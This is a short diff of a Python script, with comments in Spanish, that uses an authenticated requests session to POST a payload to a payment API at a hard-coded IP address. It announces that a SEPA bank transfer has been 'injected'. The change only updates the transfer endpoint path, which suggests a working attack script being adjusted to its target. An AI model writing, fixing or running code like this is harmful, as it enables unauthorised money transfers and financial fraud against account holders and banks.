@@ -67,7 +67,7 @@ session = requests.Session()
 session.headers.update(headers)
 
 # === Inyectamos transferencia ===
-transfer_url = "http://80.78.30.242:9181/api/transferencia/"
+transfer_url = "http://80.78.30.242:9181/api/send-transfer"
 transfer_r = session.post(transfer_url, json=payload)
 print("\n[+] ¡Transferencia SEPA inyectada!")
 print("Status code:", transfer_r.status_code)
